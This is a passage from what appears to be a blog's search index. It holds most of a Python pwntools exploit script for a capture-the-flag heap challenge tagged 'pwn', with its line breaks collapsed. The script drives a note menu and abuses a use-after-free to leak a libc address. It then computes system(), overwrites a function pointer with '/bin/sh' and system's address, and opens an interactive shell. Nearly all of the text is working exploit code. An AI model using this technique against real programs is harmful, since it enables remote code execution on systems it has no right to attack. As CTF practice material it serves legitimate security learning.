p.recvuntil("Your choice :") p.sendline('1') p.recvuntil("Content size:") p.sendline(str(size)) p.recvuntil("Input the content:") p.sendline(content)def delete(index): p.recvuntil("Your choice :") p.sendline('4') p.recvuntil("Input the index:") p.sendline(str(index))def edit(index,content): p.recvuntil("Your choice :") p.sendline('2') p.recvuntil("Input the index:") p.sendline(str(index)) p.recvuntil("New content:") p.sendline(content)def prints(index): p.recvuntil("Your choice :") p.sendline('3') p.recvuntil("Input the index:") p.sendline(str(index))#0add(100,'a'*4)#1add(12,'/bin/sh')delete(1)delete(0)prints(1)prints(0)addr = u32(p.recv(4))print "addr:0x%x" %addrlibc_base = addr - offsetsys_addr = libc_base+libc.symbols['system']print "sys:0x%x"%sys_addr#2add(12,'c'*4)edit(2,'/bin/sh\0'+p32(sys_addr))prints(1)p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
